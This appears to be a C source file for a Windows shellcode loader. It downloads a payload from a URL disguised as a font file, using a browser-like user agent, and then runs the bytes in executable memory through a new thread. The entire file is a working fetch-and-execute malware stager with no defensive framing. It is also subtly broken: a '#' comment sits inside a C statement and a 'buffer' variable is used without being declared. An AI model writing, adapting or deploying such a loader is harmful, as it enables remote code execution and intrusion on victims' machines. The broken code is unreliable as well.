#include <windows.h>
#include <wininet.h>
#include <stdio.h>
#include <stdlib.h>

#pragma comment(lib, "wininet.lib")

#define MAX_RETRIES 3
#define CHUNK_SIZE  (1024 * 1024)

int main() {
    const char *url = "http://example.com/fontawesome.woff"; #shellcode hosting url
    HINTERNET hInternet = NULL, hFile = NULL;
    unsigned char *shellcode = NULL;
    SIZE_T shellcodeSize = 0;
    DWORD bytesRead;
    int attempt;

    for (attempt = 1; attempt <= MAX_RETRIES; attempt++) {
        hInternet = InternetOpen("Mozilla/5.0 (Windows NT 10.0; Win64; x64)", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
        if (!hInternet) {
            printf("[-] InternetOpen failed on attempt %d\n", attempt);
            continue;
        }

        hFile = InternetOpenUrl(hInternet, url, NULL, 0, INTERNET_FLAG_RELOAD, 0);
        if (!hFile) {
            printf("[-] InternetOpenUrl failed on attempt %d\n", attempt);
            InternetCloseHandle(hInternet);
            continue;
        }

        shellcode = NULL;
        shellcodeSize = 0;
        while (InternetReadFile(hFile, buffer, CHUNK_SIZE, &bytesRead) && bytesRead > 0) {
            unsigned char *tmp = realloc(shellcode, shellcodeSize + bytesRead);
            if (!tmp) {
                printf("[-] Memory allocation failed\n");
                free(shellcode);
                InternetCloseHandle(hFile);
                InternetCloseHandle(hInternet);
                return -1;
            }
            shellcode = tmp;
            memcpy(shellcode + shellcodeSize, buffer, bytesRead);
            shellcodeSize += bytesRead;
        }

        InternetCloseHandle(hFile);
        InternetCloseHandle(hInternet);

        if (shellcodeSize > 0) {
            printf("[+] Download completed, %llu bytes received\n", (unsigned long long)shellcodeSize);
            break;
        } else {
            printf("[-] No data downloaded on attempt %d\n", attempt);
        }

        if (attempt == MAX_RETRIES) {
            printf("[-] Maximum retries reached, exiting.\n");
            return -1;
        }
    }

    LPVOID execMem = VirtualAlloc(NULL, shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!execMem) {
        printf("[-] VirtualAlloc failed\n");
        free(shellcode);
        return -1;
    }
    printf("[+] Memory allocated at %p (%llu bytes)\n", execMem, (unsigned long long)shellcodeSize);

    SIZE_T offset = 0;
    while (offset < shellcodeSize) {
        SIZE_T chunk = (shellcodeSize - offset > CHUNK_SIZE) ? CHUNK_SIZE : (shellcodeSize - offset);
        memcpy((unsigned char*)execMem + offset, shellcode + offset, chunk);
        printf("[+] Copied bytes %llu-%llu\n", (unsigned long long)offset, (unsigned long long)(offset + chunk));
        offset += chunk;
    }

    HANDLE thread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)execMem, NULL, 0, NULL);
    if (!thread) {
        printf("[-] CreateThread failed\n");
        VirtualFree(execMem, 0, MEM_RELEASE);
        free(shellcode);
        return -1;
    }
    printf("[+] Thread started, waiting for completion\n");

    WaitForSingleObject(thread, INFINITE);
    printf("[+] Shellcode execution finished\n");

    free(shellcode);
    VirtualFree(execMem, 0, MEM_RELEASE);

    return 0;
}
